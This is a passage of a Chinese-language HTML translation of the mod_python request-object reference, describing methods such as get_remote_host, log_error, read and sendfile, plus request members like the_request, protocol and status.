<font face="Courier New, monospace"><span lang="en-US"><b>allow_methods(methods[,reset])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">添加方法到</font><font face="Courier New, monospace"><span lang="en-US">req.allowed_methods</span></font><font face="宋体">列表。这个列表将会允许传递，在头部指定</font><font face="Courier New, monospace"><span lang="en-US">HTTP_METHOD_NOT_ALLOWED</span></font><font face="宋体">或</font><font face="Courier New, monospace"><span lang="en-US">HTTP_NOT_IMPLEMENTED</span></font><font face="宋体">返回到客户端。注意</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">并不会对这些方法起作用。这个列表仅仅用于构造头部。实际的方法处理逻辑在处理器代码中提供。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">methods</span></font><font face="宋体">是一个字符串列表，如果</font><font face="Courier New, monospace"><span lang="en-US">reset</span></font><font face="宋体">设置为</font><font face="Courier New, monospace"><span lang="en-US">1</span></font><font face="宋体">，则列表会被清空。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>document_root()</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">返回</font><font face="Courier New, monospace"><span lang="en-US">DocumentRoot</span></font><font face="宋体">设置</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>get_basic_auth_pw()</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">返回简单认证时的密码字符串</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>get_config()</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">返回包含</font><font face="Courier New, monospace"><span lang="en-US">mod_python</span></font><font face="宋体">配置的表格对象的引用，用于当前请求，除了</font><font face="Courier New, monospace"><span lang="en-US">Python*Handler</span></font><font face="宋体">和</font><font face="Courier New, monospace"><span lang="en-US">PythonOption(</span></font><font face="宋体">可以通过</font><font face="Courier New, monospace"><span lang="en-US">req.get_options()</span></font><font face="宋体">获得</font><font face="Courier New, monospace"><span lang="en-US">)</span></font><font face="宋体">。表格包含键，和值列表。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>get_remote_host([type,str_is_ip])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">用于查询客户端的</font><font face="Courier New, monospace"><span lang="en-US">DNS</span></font><font face="宋体">名和</font><font face="Courier New, monospace"><span lang="en-US">IP</span></font><font face="宋体">地址，首次调用时查询</font><font face="Courier New, monospace"><span lang="en-US">DNS</span></font><font face="宋体">，其后的查询返回缓存数据。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">可选参数</font><font face="Courier New, monospace"><span lang="en-US">type</span></font><font face="宋体">可为如下值：</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">apache.REMOTE_HOST</span></font><font face="宋体">：查询</font><font face="Courier New, monospace"><span lang="en-US">DNS</span></font><font face="宋体">名，当</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">标志</font><font face="Courier New, monospace"><span lang="en-US">HostNameLookups</span></font><font face="宋体">为</font><font face="Courier New, monospace"><span lang="en-US">off</span></font><font face="宋体">时返回</font><font face="Courier New, monospace"><span lang="en-US">None</span></font><font face="宋体">，无法查询。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">apache.REMOTE_NAME</span></font><font face="宋体">：缺省值，尽可能返回</font><font face="Courier New, monospace"><span lang="en-US">DNS</span></font><font face="宋体">名，否则返回</font><font face="Courier New, monospace"><span lang="en-US">IP</span></font><font face="宋体">地址字符串。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">apache.REMOTE_NOLOOKUP</span></font><font face="宋体">：不执行</font><font face="Courier New, monospace"><span lang="en-US">DNS</span></font><font face="宋体">查询，直接返回</font><font face="Courier New, monospace"><span lang="en-US">IP</span></font><font face="宋体">地址。如果曾经执行过查询，则返回缓存的机器名。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">apache.REMOTE_DOUBLE_REV</span></font><font face="宋体">：强制使用</font><font face="Courier New, monospace"><span lang="en-US">double-reverse</span></font><font face="宋体">查询，失败返回</font><font face="Courier New, monospace"><span lang="en-US">None</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">如果</font><font face="Courier New, monospace"><span lang="en-US">str_is_ip</span></font><font face="宋体">设为</font><font face="Courier New, monospace"><span lang="en-US">None</span></font><font face="宋体">或未指定，则返回值为</font><font face="Courier New, monospace"><span lang="en-US">DNS</span></font><font face="宋体">名或</font><font face="Courier New, monospace"><span lang="en-US">IP</span></font><font face="宋体">地址的字符串。如果</font><font face="Courier New, monospace"><span lang="en-US">str_is_ip</span></font><font face="宋体">不为</font><font face="Courier New, monospace"><span lang="en-US">None</span></font><font face="宋体">，则返回一个</font><font face="Courier New, monospace"><span lang="en-US">(address,str_is_ip)</span></font><font face="宋体">元组。当</font><font face="Courier New, monospace"><span lang="en-US">str_is_ip</span></font><font face="宋体">为非零则</font><font face="Courier New, monospace"><span lang="en-US">address</span></font><font face="宋体">为</font><font face="Courier New, monospace"><span lang="en-US">IP</span></font><font face="宋体">地址字符串。失败返回</font><font face="Courier New, monospace"><span lang="en-US">None</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>get_options()</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">返回</font><font face="Courier New, monospace"><span lang="en-US">PythonOptions</span></font><font face="宋体">标志的选项表格的引用。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>internal_redirect(new_uri)</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">对请求进行内部重定向。</font><font face="Courier New, monospace"><span lang="en-US">new_uri</span></font><font face="宋体">是字符串。内部重定向将会创建一个新的请求对象，并执行所有的阶段。</font><font face="Courier New, monospace"><span lang="en-US">req.prev</span></font><font face="宋体">包含重定向之前的地址。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>log_error(message[,level])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">对</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">函数</font><font face="Courier New, monospace"><span lang="en-US">ap_log_error()</span></font><font face="宋体">函数的接口。</font><font face="Courier New, monospace"><span lang="en-US">message</span></font><font face="宋体">是日志信息，</font><font face="Courier New, monospace"><span lang="en-US">level</span></font><font face="宋体">是日志级别标志，可为如下值：</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_EMERG</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_ALERT</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_CRIT</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_ERR</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_WARNNING</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_NOTICE</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_INFO</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_DEBUG</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">APLOG_NOERRNO</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">如果需要写入日志而不是通过请求对象，可用</font><font face="Courier New, monospace"><span lang="en-US">apache.log_error</span></font><font face="宋体">函数。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>meets_conditions()</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">调用</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">函数</font><font face="Courier New, monospace"><span lang="en-US">ap_meets_conditions()</span></font><font face="宋体">返回状态码。如果</font><font face="Courier New, monospace"><span lang="en-US">status</span></font><font face="宋体">是</font><font face="Courier New, monospace"><span lang="en-US">apache.OK</span></font><font face="宋体">，则响应正确。如果不是则简单的返回状态码</font><font face="Courier New, monospace"><span lang="en-US">status</span></font><font face="宋体">。注意</font><font face="Courier New, monospace"><span lang="en-US">req.headers_out</span></font><font face="宋体">将会被优先</font><font face="Courier New, monospace"><span lang="en-US">(prior)</span></font><font face="宋体">设置，并也会影响</font><font face="Courier New, monospace"><span lang="en-US">req.status</span></font><font face="宋体">的值，假如不是返回</font><font face="Courier New, monospace"><span lang="en-US">apache.OK</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">例如：</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">...</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">r.headers_out['ETag']="1130794f-3774-4584-a4ea-0ab19e684268"</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">r.headers_out['Last-Modified']='Wed, 23 Feb 2005 00:00:00
GMT'</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">r.headers_out['Expires']='Mon, 18 Apr 2005 17:30:00
GMT'</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">status=r.meets_conditons()</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">if
status!=apache.OK:</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">return
status</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">...</span></font>
<font face="宋体">处理响应内容</font> <font face="Courier New, monospace"><span lang="en-US">...</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>requires()</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">返回包含</font><font face="Courier New, monospace"><span lang="en-US">require</span></font><font face="宋体">标志参数的元组。例如如下</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">配置：</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">AuthType
Basic</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">require user
joe</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">require
valid-user</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">函数将会返回</font><font face="Courier New, monospace"><span lang="en-US">('user
joe','valid-user')</span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>read([len])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">从客户端读取最多</font><font face="Courier New, monospace"><span lang="en-US">len</span></font><font face="宋体">字节的数据，返回字符串数据。如果</font><font face="Courier New, monospace"><span lang="en-US">len</span></font><font face="宋体">为负数</font><font face="Courier New, monospace"><span lang="en-US">(negative)</span></font><font face="宋体">或者缺省</font><font face="Courier New, monospace"><span lang="en-US">(omitted)</span></font><font face="宋体">，则读取所有的数据。这个函数也会受到</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">配置标志</font><font face="Courier New, monospace"><span lang="en-US">Timeout</span></font><font face="宋体">的影响，如果读取时超时则会终端，并抛出</font><font face="Courier New, monospace"><span lang="en-US">IOError</span></font><font face="宋体">异常。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">这个函数依赖于</font><font face="Courier New, monospace"><span lang="en-US">(rely</span></font><font face="宋体">的复数</font><font face="Courier New, monospace"><span lang="en-US">relies)</span></font><font face="宋体">客户端提供的</font><font face="Courier New, monospace"><span lang="en-US">Content-length</span></font><font face="宋体">头。如果未提供这个头，则缺省为</font><font face="Courier New, monospace"><span lang="en-US">0</span></font><font face="宋体">。不正确的</font><font face="Courier New, monospace"><span lang="en-US">Content-length</span></font><font face="宋体">将会导致函数试图读取更多的数据，并且在超时到达之前一直出于阻塞状态。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>readline([len])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">像</font><font face="Courier New, monospace"><span lang="en-US">read()</span></font><font face="宋体">一样读取到行尾。注意，同</font><font face="Courier New, monospace"><span lang="en-US">HTTP</span></font><font face="宋体">定义一样，大多数客户端的行结束是</font><font face="Courier New, monospace"><span lang="en-US">'\r\n'</span></font><font face="宋体">，而不是简单的</font><font face="Courier New, monospace"><span lang="en-US">'\n'</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>readlines([sizehint])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">读取</font><font face="Courier New, monospace"><span lang="en-US">sizehint</span></font><font face="宋体">字节以内的所有行，并返回行列表。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>register_cleanup(callable[,da<wbr>ta])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">注册一个清理行为。参数</font><font face="Courier New, monospace"><span lang="en-US">callable</span></font><font face="宋体">可以为任何可调用对象，可选参数</font><font face="Courier New, monospace"><span lang="en-US">da<wbr>ta</span></font><font face="宋体">可以是任何对象，缺省为</font><font face="Courier New, monospace"><span lang="en-US">None</span></font><font face="宋体">。在每个请求结束的时候，而在请求对象被销毁之前，</font><font face="Courier New, monospace"><span lang="en-US">callable</span></font><font face="宋体">将会被调用，并且传递一个唯一的参数</font><font face="Courier New, monospace"><span lang="en-US">da<wbr>ta</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">推荐传递请求对象作为</font><font face="Courier New, monospace"><span lang="en-US">da<wbr>ta</span></font><font face="宋体">，但是注意，在执行清理行为时，请求对象的处理已经完成，这时再对客户端进行写操作是无意义的</font><font face="Courier New, monospace"><span lang="en-US">(pointless)</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">如果在执行清理时遇到</font><font face="Courier New, monospace"><span lang="en-US">(encounter)</span></font><font face="宋体">错误，将会被日志记录。除非直接影响请求处理，否则执行清理中的</font><font face="Courier New, monospace"><span lang="en-US">bug</span></font><font face="宋体">很难辨认</font><font face="Courier New, monospace"><span lang="en-US">(spot)</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">如果在清理行为之前，服务器关闭了，则很可能不会被执行。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>sendfile(path[,offset,len])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">发送</font><font face="Courier New, monospace"><span lang="en-US">path</span></font><font face="宋体">文件到客户端，开始为</font><font face="Courier New, monospace"><span lang="en-US">offset</span></font><font face="宋体">，并发送</font><font face="Courier New, monospace"><span lang="en-US">len</span></font><font face="宋体">字节。</font><font face="Courier New, monospace"><span lang="en-US">offset</span></font><font face="宋体">缺省为</font><font face="Courier New, monospace"><span lang="en-US">0</span></font><font face="宋体">，而</font><font face="Courier New, monospace"><span lang="en-US">len</span></font><font face="宋体">缺省为</font><font face="Courier New, monospace"><span lang="en-US">-1</span></font><font face="宋体">，发送整个</font><font face="Courier New, monospace"><span lang="en-US">(entire)</span></font><font face="宋体">文件。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">返回成功发送的字节数，或者在出错时抛出</font><font face="Courier New, monospace"><span lang="en-US">IOError</span></font><font face="宋体">异常。这个函数提供了向客户端发送文件的最有效</font><font face="Courier New, monospace"><span lang="en-US">(most
efficient)</span></font><font face="宋体">的方式。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>write(string[,flush=1])</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">将字符串立即</font><font face="Courier New, monospace"><span lang="en-US">(directly)</span></font><font face="宋体">写入客户端，然活清空</font><font face="Courier New, monospace"><span lang="en-US">(flush)</span></font><font face="宋体">缓存，除非</font><font face="Courier New, monospace"><span lang="en-US">flush</span></font><font face="宋体">是</font><font face="Courier New, monospace"><span lang="en-US">0</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>flush()</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">将缓存数据写入客户端，并清空缓存。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>set_content_length(len)</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">设置</font><font face="Courier New, monospace"><span lang="en-US">req.length</span></font><font face="宋体">和</font><font face="Courier New, monospace"><span lang="en-US">"Content-length"</span></font><font face="宋体">头。注意必须在任何发送数据之前设置，比如</font><font face="Courier New, monospace"><span lang="en-US">req.write()</span></font><font face="宋体">之前，否则是无意义的</font><font face="Courier New, monospace"><span lang="en-US">(meaningless)</span></font><font face="宋体">。</font></p>
<ul><li>
<p style="margin-bottom: 0cm; color: rgb(0, 0, 0);" align="justify"><font face="宋体"><b>请求对象的成员：</b></font></p>
</li></ul>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>connection</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">这个请求的连接对象。查看后面的详细介绍。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>server</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">请求所属的服务器对象。查看后面的详细介绍。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>next</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">如果是内部重定向，重定向到的请求对象。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>prev</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">如果是内部重定向，来自重定向的请求对象。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>main</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">如果这是一个子请求，指向主请求。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>the_request</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">包含请求的第一行的字符串。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>assbackwards</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">指定</font><font face="Courier New, monospace"><span lang="en-US">HTTP/0.9</span></font><font face="宋体">的简单请求。这意味着响应不包含任何头，仅包含信息主体。用于兼容古老的浏览器。也可以指定这个选项用于在重定向中避免</font><font face="Courier New, monospace"><span lang="en-US">(avoid)</span></font><font face="宋体">发送头。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>proxyreq</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">代理请求。一个</font><font face="Courier New, monospace"><span lang="en-US">apache.PROXYREQ_*</span></font><font face="宋体">值。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>header_on<wbr>ly</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">指定</font><font face="Courier New, monospace"><span lang="en-US">HEAD</span></font><font face="宋体">请求的布尔变量，反对</font><font face="Courier New, monospace"><span lang="en-US">GET</span></font><font face="宋体">。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>protocol</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">客户端提供的协议，或者是</font><font face="Courier New, monospace"><span lang="en-US">'HTTP/0.9'</span></font><font face="宋体">。同</font><font face="Courier New, monospace"><span lang="en-US">CGI SERVER_PROTOCOL</span></font><font face="宋体">。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>proto_num</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">整数，协议版本号，比如</font><font face="Courier New, monospace"><span lang="en-US">1.1</span></font><font face="宋体">对应</font><font face="Courier New, monospace"><span lang="en-US">1001</span></font><font face="宋体">。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>hostname</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">字符串，由</font><font face="Courier New, monospace"><span lang="en-US">URI</span></font><font face="宋体">或</font><font face="Courier New, monospace"><span lang="en-US">Host:</span></font><font face="宋体">设置，头。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>request_time</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">长整数，请求发生的时间。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>status_line</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">状态行，如</font><font face="Courier New, monospace"><span lang="en-US">'200
OK'</span></font><font face="宋体">。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>status</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">状态，</font><font face="Courier New, monospace"><span lang="en-US">apache.HTTP_*</span></font><font face="宋体">中的一个值。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>method</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">包含方法的字符串，如</font><font face="Courier New, monospace"><span lang="en-US">'GET'</span></font><font face="宋体">，</font><font face="Courier New, monospace"><span lang="en-US">'HEAD'</span></font><font face="宋体">，</font><font face="Courier New, monospace"><span lang="en-US">'POST'</span></font><font face="宋体">。同</font><font face="Courier New, monospace"><span lang="en-US">CGI
REQUEST_METHOD</span></font><font face="宋体">。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>method_number</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">方法号，整数。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>allowed</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">整数，允许方法的位逻辑。使用允许结构：头响应</font><font face="Courier New, monospace"><span lang="en-US">HTTP_METHOD_NOT_ALLOWED</span></font><font face="宋体">或</font><font face="Courier New, monospace"><span lang="en-US">HTTP_NOT_IMPLEMENTED</span></font><font face="宋体">。这个字段是</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">内部使用的。需要设置则使用</font><font face="Courier New, monospace"><span lang="en-US"><font color="#0000ff">req.allow_methods()</font></span></font><font face="宋体">方法。只读。</font></p>
